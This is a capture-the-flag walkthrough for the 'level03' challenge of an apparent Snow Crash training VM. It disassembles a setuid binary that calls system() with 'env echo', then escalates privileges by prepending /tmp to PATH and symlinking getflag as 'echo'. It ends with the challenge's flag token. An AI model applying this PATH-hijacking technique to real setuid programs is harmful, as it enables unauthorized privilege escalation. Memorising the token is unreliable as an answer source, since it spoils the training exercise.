# level03

## Steps

1. __Action__ (Guest): list the files present at the root
    ```sh
    ls -A
    ```

2. __Observation__ (Guest): the previous command reveals a `level03` file
    ```
    .bash_logout  .bashrc  level03  .profile
    ```

3. __Action__ (Guest): get more information on the file
    ```sh
    getfacl level03
    ```

4. __Observation__ (Guest): the previous command reveals the file is an
    executable and has the `setuid` and the `setgid` bits enabled
    ```
    # file: level03
    # owner: flag03
    # group: level03
    # flags: ss-
    user::rwx
    group::r-x
    other::r-x
    ```

4. __Action__ (Guest): execute the executable
    ```sh
    ./level03
    ```

5. __Observation__ (Guest): the message `Exploit me` appears on stdout

6. __Action__ (Guest): gather more information on the executable
    Running the program under `gdb` gives us nothing
    but disassembling the main gives us useful information
    ```
    break main
    run
    disassemble
    ```

7. __Observation__ (Guest): a few fonctions are called in the main
    ```
    Dump of assembler code for function main:
    0x080484a4 <+0>:	push   %ebp
    0x080484a5 <+1>:	mov    %esp,%ebp
    0x080484a7 <+3>:	and    $0xfffffff0,%esp
    0x080484aa <+6>:	sub    $0x20,%esp
    => 0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
    0x080484b2 <+14>:	mov    %eax,0x18(%esp)
    0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
    0x080484bb <+23>:	mov    %eax,0x1c(%esp)
    0x080484bf <+27>:	mov    0x18(%esp),%eax
    0x080484c3 <+31>:	mov    %eax,0x8(%esp)
    0x080484c7 <+35>:	mov    0x18(%esp),%eax
    0x080484cb <+39>:	mov    %eax,0x4(%esp)
    0x080484cf <+43>:	mov    0x18(%esp),%eax
    0x080484d3 <+47>:	mov    %eax,(%esp)
    0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
    0x080484db <+55>:	mov    0x1c(%esp),%eax
    0x080484df <+59>:	mov    %eax,0x8(%esp)
    0x080484e3 <+63>:	mov    0x1c(%esp),%eax
    0x080484e7 <+67>:	mov    %eax,0x4(%esp)
    0x080484eb <+71>:	mov    0x1c(%esp),%eax
    0x080484ef <+75>:	mov    %eax,(%esp)
    0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
    0x080484f7 <+83>:	movl   $0x80485e0,(%esp)
    0x080484fe <+90>:	call   0x80483b0 <system@plt>
    0x08048503 <+95>:	leave
    0x08048504 <+96>:	ret
    End of assembler dump.
    ```
    - `getegid()` (returns the effective group ID of the calling process)
    - `geteuid()` (returns the effective user ID of the calling process)
    - `setresgid(gid_t rgid, gid_t egid, gid_t sgid)`
    (sets the real group ID, the effective group ID,
    and the saved set-group-ID of the calling process)
    - `setresuid(uid_t ruid, uid_t euid, uid_t suid)`
    (sets the real user ID, the effective user ID,
    and the saved set-user-ID of the calling process)
    - `system(const char *command)`
    (executes a command by calling `/bin/sh -c command`)

8. __Action__ (Host): we copy the executable on our host machine
    to better manipulate it
    ```sh
    sshpass -f snow-crash/level02/flag \
    scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 level03
    docker cp snow-crash:level03 .
    ```

9. __Action__ (Host): pass the executable to [dogbolt](https://dogbolt.org/)
    to decompile it

10. __Observation__ (Host): a few things are to observe here
    ```c
    // ------------------------ Functions -------------------------

    // From module:   /home/user/level03/level03.c
    // Address range: 0x80484a4 - 0x8048505
    // Line range:    7 - 18
    int main() {
        int32_t v1 = getegid(); // 0x80484ad
        int32_t v2 = geteuid(); // 0x80484b6
        setresgid(v1, v1, v1);
        setresuid(v2, v2, v2);
        return system("/usr/bin/env echo Exploit me");
    }
    ```
    - The effective GID and UID are stored in variables `v1` and `v2`.
    - Those variables are used to set the real, effective and saved ID
    of both the user and group.

11. __Observation__ (Guest): we need to run `getflag` when running `./level03`
    as we'll have the same ID as `flag03` when we'll do it. this will be done
    by creating a symbolic link between the `getflag` and the `echo` commands

12. __Action__ (Guest): create a symbolic link between `getflag` and `echo`
    adding a new path in `PATH`
    ```sh
    export PATH=/tmp:$PATH
    ln -s $(which getflag) /tmp/echo
    ```

16. __Action__ (Guest): execute `./level03`
    ```sh
    ./level03
    ```

17. __Observation__ (Guest): the flag is displayed on stdout
    ```
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
    ```
